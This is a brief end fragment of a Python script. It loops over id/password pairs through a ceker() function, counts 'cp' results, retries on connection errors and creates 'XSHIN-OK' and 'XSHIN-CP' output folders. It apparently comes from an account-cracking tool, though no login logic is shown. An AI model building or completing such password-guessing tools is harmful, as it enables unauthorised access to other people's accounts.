				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	

#----------[ CEK-OPSI ]----------#
#----------[ SYSTEM-CONTROL ]----------#	
if __name__=='__main__':
	try:os.mkdir('XSHIN-OK')
	except:pass
	try:os.mkdir('XSHIN-CP')
	except:pass
	menu()
	
	
